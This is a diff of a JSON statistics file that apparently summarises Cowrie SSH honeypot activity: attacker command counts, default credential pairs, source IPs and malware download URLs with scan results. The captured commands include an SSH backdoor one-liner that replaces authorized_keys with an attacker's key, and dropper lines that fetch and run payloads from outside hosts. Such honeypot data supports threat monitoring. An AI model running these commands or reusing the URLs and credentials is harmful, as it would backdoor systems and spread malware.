     },
     {
@@ -11721,7 +11721,7 @@
       "count": 7
     },
     {
-      "input": "perl /var/tmp/clamav.pl;rm -rf /var/tmp/clamav.pl",
+      "input": "id -u",
       "count": 7
     }
   ],
@@ -11867,11 +11867,11 @@
       "count": 646
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 643
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "lscpu | grep Model",
       "count": 643
     }
   ],
@@ -12024,7 +12024,7 @@
       "count": 378
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "uname",
       "count": 377
     },
     {
@@ -12032,7 +12032,7 @@
       "count": 377
     },
     {
-      "input": "uname",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 377
     }
   ],
@@ -12181,11 +12181,7 @@
       "count": 9622
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 179
-    },
-    {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "which ls",
       "count": 179
     },
     {
@@ -12193,7 +12189,11 @@
       "count": 179
     },
     {
-      "input": "which ls",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 179
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 179
     }
   ],
@@ -12338,15 +12338,7 @@
   ],
   "commands": [
     {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
-      "count": 753
-    },
-    {
-      "input": "ls -lh $(which ls)",
-      "count": 753
-    },
-    {
-      "input": "which ls",
+      "input": "w",
       "count": 753
     },
     {
@@ -12354,7 +12346,15 @@
       "count": 753
     },
     {
-      "input": "w",
+      "input": "which ls",
+      "count": 753
+    },
+    {
+      "input": "ls -lh $(which ls)",
+      "count": 753
+    },
+    {
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
       "count": 753
     }
   ],
@@ -12499,15 +12499,15 @@
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 269
-    },
-    {
       "input": "uname -a",
       "count": 269
     },
     {
-      "input": "top",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "count": 269
+    },
+    {
+      "input": "lscpu | grep Model",
       "count": 268
     },
     {
@@ -12515,7 +12515,7 @@
       "count": 268
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
       "count": 268
     }
   ],
@@ -12533,11 +12533,11 @@
       "count": 15
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane admin",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane admin",
       "count": 1
     }
   ],
@@ -12648,13 +12648,13 @@
       "count": 53
     },
     {
-      "username": "minerstat",
-      "password": "msos",
+      "username": "mos",
+      "password": "mos",
       "count": 10
     },
     {
-      "username": "mos",
-      "password": "mos",
+      "username": "minerstat",
+      "password": "msos",
       "count": 10
     }
   ],
@@ -12664,11 +12664,7 @@
       "count": 18665
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 259
-    },
-    {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "which ls",
       "count": 259
     },
     {
@@ -12676,7 +12672,11 @@
       "count": 259
     },
     {
-      "input": "which ls",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 259
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 259
     }
   ],
@@ -12694,11 +12694,11 @@
       "count": 2
     },
     {
-      "input": "rm -rf /var/tmp/dota*",
+      "input": "nproc;wget -qO - chairfiller.org/smtp|perl",
       "count": 1
     },
     {
-      "input": "nproc;wget -qO - chairfiller.org/smtp|perl",
+      "input": "rm -rf /var/tmp/dota*",
       "count": 1
     }
   ],
@@ -12846,7 +12846,7 @@
       "count": 13
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
       "count": 1
     },
     {
@@ -12854,7 +12854,7 @@
       "count": 1
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     }
   ],
@@ -12868,11 +12868,11 @@
       "count": 13
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
       "count": 1
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 1
     }
   ],
@@ -12995,11 +12995,7 @@
   ],
   "commands": [
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 344
-    },
-    {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "input": "uname",
       "count": 344
     },
     {
@@ -13007,7 +13003,11 @@
       "count": 344
     },
     {
-      "input": "uname",
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
+      "count": 344
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 344
     },
     {
@@ -13029,11 +13029,11 @@
       "count": 3
     },
     {
-      "input": "uname -a",
+      "input": "top",
       "count": 2
     },
     {
-      "input": "top",
+      "input": "uname -a",
       "count": 2
     }
   ],
@@ -13076,12 +13076,12 @@
       "count": 858
     },
     {
-      "src_ip": "5.188.86.207",
+      "src_ip": "5.188.86.167",
       "robot": true,
       "count": 841
     },
     {
-      "src_ip": "5.188.86.167",
+      "src_ip": "5.188.86.207",
       "robot": true,
       "count": 841
     },
@@ -13190,11 +13190,11 @@
       "count": 10
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+      "input": "echo Hi | cat -n",
       "count": 1
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
       "count": 1
     }
   ],
@@ -13300,13 +13300,13 @@
       "count": 8
     },
     {
-      "username": "root",
-      "password": "123",
+      "username": "support",
+      "password": "support",
       "count": 6
     },
     {
-      "username": "support",
-      "password": "support",
+      "username": "root",
+      "password": "123",
       "count": 6
     },
     {
@@ -13332,12 +13332,12 @@
       "count": 54
     },
     {
-      "src_ip": "174.138.49.199",
+      "src_ip": "106.75.122.38",
       "dst_port": 2222,
       "count": 50
     },
     {
-      "src_ip": "106.75.122.38",
+      "src_ip": "174.138.49.199",
       "dst_port": 2222,
       "count": 50
     }
@@ -13410,7 +13410,7 @@
       "count": 368
     },
     {
-      "input": "top",
+      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
       "count": 366
     },
     {
@@ -13418,7 +13418,7 @@
       "count": 366
     },
     {
-      "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
+      "input": "top",
       "count": 366
     }
   ],
@@ -13432,7 +13432,7 @@
       "count": 15
     },
     {
-      "input": "echo Hi | cat -n",
+      "input": "free -m",
       "count": 2
     },
     {
@@ -13440,7 +13440,7 @@
       "count": 2
     },
     {
-      "input": "free -m",
+      "input": "echo Hi | cat -n",
       "count": 2
     }
   ],
@@ -13576,11 +13576,11 @@
         "count": 228
       },
       {
-        "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+        "input": "top",
         "count": 227
       },
       {
-        "input": "top",
+        "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
         "count": 227
       }
     ],
@@ -13598,11 +13598,11 @@
         "count": 4
       },
       {
-        "input": "echo Hi | cat -n",
+        "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
         "count": 2
       },
       {
-        "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane 1",
+        "input": "echo Hi | cat -n",
         "count": 2
       }
     ],
@@ -13757,11 +13757,11 @@
       "count": 100
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | wc -l",
+      "input": "uname -a",
       "count": 99
     },
     {
-      "input": "uname -a",
+      "input": "cat /proc/cpuinfo | grep name | wc -l",
       "count": 99
     },
     {
@@ -13779,11 +13779,11 @@
       "count": 98
     },
     {
-      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
+      "input": "free -m",
       "count": 2
     },
     {
-      "input": "free -m",
+      "input": "cd /var/run ; rm -rf tsh ; tftp -g 127.0.0.1 -r tsh ; sh tsh &",
       "count": 2
     },
     {
@@ -13925,11 +13925,7 @@
       "count": 560
     },
     {
-      "input": "crontab -l",
-      "count": 552
-    },
-    {
-      "input": "w",
+      "input": "uname",
       "count": 552
     },
     {
@@ -13937,7 +13933,11 @@
       "count": 552
     },
     {
-      "input": "uname",
+      "input": "w",
+      "count": 552
+    },
+    {
+      "input": "crontab -l",
       "count": 552
     }
   ],
@@ -14019,19 +14019,19 @@
   ],
   "file_download": [
     {
-      "url": "http://209.141.52.40/sensi.sh",
-      "outfile": "var/lib/cowrie/downloads/20fc37b8343797af0c8398cfdd011e356f9e682352a30dbf845d07c0f2057c57",
+      "url": "http://104.244.77.74/new/x",
+      "outfile": "var/lib/cowrie/downloads/d07abee22ea585ce2cbe684949924ee211c70a12de1154247bd03ab43e4b62dd",
       "scans": {
-        "positives": 30,
+        "positives": 13,
         "total": 58
       },
       "count": 1
     },
     {
-      "url": "http://104.244.77.74/new/x",
-      "outfile": "var/lib/cowrie/downloads/d07abee22ea585ce2cbe684949924ee211c70a12de1154247bd03ab43e4b62dd",
+      "url": "http://209.141.52.40/sensi.sh",
+      "outfile": "var/lib/cowrie/downloads/20fc37b8343797af0c8398cfdd011e356f9e682352a30dbf845d07c0f2057c57",
       "scans": {
-        "positives": 13,
+        "positives": 30,
         "total": 58
       },
       "count": 1
@@ -14132,11 +14132,11 @@
       "count": 15
     },
     {
-      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
+      "input": "free -m",
       "count": 4
     },
     {
-      "input": "free -m",
+      "input": "cd /dev/shm || cd /tmp || cd /var/run || cd /mnt; wget 198.98.56.65/krax || curl -o krax 198.98.56.65/krax; tar xvf krax; cd ._lul; chmod +x *; ./krn; ./krane Root12345",
       "count": 4
     },
     {
@@ -14267,11 +14267,7 @@
       "count": 18339
     },
     {
-      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 945
-    },
-    {
-      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "input": "which ls",
       "count": 945
     },
     {
@@ -14279,7 +14275,11 @@
       "count": 945
     },
     {
-      "input": "which ls",
+      "input": "free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'",
+      "count": 945
+    },
+    {
+      "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
       "count": 945
     }
   ],
@@ -14362,28 +14362,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/dc5e4202baa2aee7fc120d377bcc2eb2aa1b4db91d5f6f309fd4d95c5e7e5363",
+      "outfile": "var/lib/cowrie/downloads/46bcca7c0d252b838a0c0d4c5ec19be5186f196c1fff0a38286bcee61caaaa98",
       "scans": {
         "positives": null,
         "total": null
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/3ac9bfab069270802b138cd069ce1ca41bc71b12d6c15840b28fa71b4e8b5cf9",
-      "scans": {
-        "positives": 0,
-        "total": 58
-      },
-      "count": 1
-    },
-    {
-      "url": null,
-      "outfile": "var/lib/cowrie/downloads/14c5dd45d844c8545a32037197ea837d1628f690483ff22a7968b10fcfd6b837",
-      "scans": {
-        "positives": 0,
-        "total": 58
       },
       "count": 1
     },
@@ -14398,7 +14380,25 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/46bcca7c0d252b838a0c0d4c5ec19be5186f196c1fff0a38286bcee61caaaa98",
+      "outfile": "var/lib/cowrie/downloads/14c5dd45d844c8545a32037197ea837d1628f690483ff22a7968b10fcfd6b837",
+      "scans": {
+        "positives": 0,
+        "total": 58
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/3ac9bfab069270802b138cd069ce1ca41bc71b12d6c15840b28fa71b4e8b5cf9",
+      "scans": {
+        "positives": 0,
+        "total": 58
+      },
+      "count": 1
+    },
+    {
+      "url": null,
+      "outfile": "var/lib/cowrie/downloads/dc5e4202baa2aee7fc120d377bcc2eb2aa1b4db91d5f6f309fd4d95c5e7e5363",
       "scans": {
         "positives": null,
         "total": null
@@ -14489,11 +14489,11 @@
       "count": 281
     },
     {
-      "input": "top",
+      "input": "lscpu | grep Model",
       "count": 277
     },
     {
-      "input": "lscpu | grep Model",
+      "input": "top",
       "count": 277
     }
   ],
@@ -14642,11 +14642,7 @@
       "count": 1007
     },
     {
-      "input": "which ls",
-      "count": 1003
-    },
-    {
-      "input": "crontab -l",
+      "input": "uname -m",
       "count": 1003
     },
     {
@@ -14654,7 +14650,11 @@
       "count": 1003
     },
     {
-      "input": "uname -m",
+      "input": "crontab -l",
+      "count": 1003
+    },
+    {
+      "input": "which ls",
       "count": 1003
     }
   ],
@@ -14672,11 +14672,11 @@
       "count": 14
     },
     {
-      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
+      "input": "uname -a",
       "count": 5
     },
     {
-      "input": "uname -a",
+      "input": "curl: option -L not recognized\ncurl: try 'curl --help' or 'curl --manual' for more information\n",
       "count": 5
     }
   ],
@@ -14736,28 +14736,10 @@
   ],
   "file_download": [
     {
-      "url": "http://209.141.41.222/bins/jew.x86",
-      "outfile": "var/lib/cowrie/downloads/6e4d477de81ddff9fc1e45ee483bd02fa10e38937f594ef0c427b0c3c6c286ca",
+      "url": "http://b.rippr.cc/curl",
+      "outfile": "var/lib/cowrie/downloads/f4178bfb5e231e0c8896d8f0314cc4ee691f0cf64474ca95c74d89b8ba1ad4b9",
       "scans": {
-        "positives": 29,
-        "total": 62
-      },
-      "count": 1
-    },
-    {
-      "url": "http://highpower.sg/.....",
-      "outfile": "var/lib/cowrie/downloads/ae9e5007de8b71cca7a456d1913be332258c60b1fb1a444e8144d99251a144c7",
-      "scans": {
-        "positives": 1,
-        "total": 57
-      },
-      "count": 1
-    },
-    {
-      "url": "http://highpower.sg/...",
-      "outfile": "var/lib/cowrie/downloads/add21ac2d57bddd23879ea57608f29b92f55ff07a814749c3940990df7a74491",
-      "scans": {
-        "positives": 42,
+        "positives": 8,
         "total": 59
       },
       "count": 1
@@ -14772,11 +14754,29 @@
       "count": 1
     },
     {
-      "url": "http://b.rippr.cc/curl",
-      "outfile": "var/lib/cowrie/downloads/f4178bfb5e231e0c8896d8f0314cc4ee691f0cf64474ca95c74d89b8ba1ad4b9",
+      "url": "http://highpower.sg/...",
+      "outfile": "var/lib/cowrie/downloads/add21ac2d57bddd23879ea57608f29b92f55ff07a814749c3940990df7a74491",
       "scans": {
-        "positives": 8,
+        "positives": 42,
         "total": 59
+      },
+      "count": 1
+    },
+    {
+      "url": "http://highpower.sg/.....",
+      "outfile": "var/lib/cowrie/downloads/ae9e5007de8b71cca7a456d1913be332258c60b1fb1a444e8144d99251a144c7",
+      "scans": {
+        "positives": 1,
+        "total": 57
+      },
+      "count": 1
+    },
+    {
+      "url": "http://209.141.41.222/bins/jew.x86",
+      "outfile": "var/lib/cowrie/downloads/6e4d477de81ddff9fc1e45ee483bd02fa10e38937f594ef0c427b0c3c6c286ca",
+      "scans": {
+        "positives": 29,
+        "total": 62
       },
       "count": 1
     }
@@ -14864,11 +14864,11 @@
       "count": 78
     },
     {
-      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
+      "input": "top",
       "count": 76
     },
     {
-      "input": "top",
+      "input": "cat /proc/cpuinfo | grep model | grep name | wc -l",
       "count": 76
     }
   ],
@@ -14951,10 +14951,10 @@
   "file_download": [
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/7478c3daf7a335e924a3cafe2e3b3224a5487e9f47d7531161534adae9cd067a",
+      "outfile": "var/lib/cowrie/downloads/15fd2fa5f51120e7c6f3b8f3fd0c86efa5bed00ffb4ccc25b001d61eac5c2493",
       "scans": {
         "positives": 0,
-        "total": 58
+        "total": 55
       },
       "count": 1
     },
@@ -14969,10 +14969,10 @@
     },
     {
       "url": null,
-      "outfile": "var/lib/cowrie/downloads/15fd2fa5f51120e7c6f3b8f3fd0c86efa5bed00ffb4ccc25b001d61eac5c2493",
+      "outfile": "var/lib/cowrie/downloads/7478c3daf7a335e924a3cafe2e3b3224a5487e9f47d7531161534adae9cd067a",
       "scans": {
         "positives": 0,
-        "total": 55
+        "total": 58
       },
       "count": 1
     }
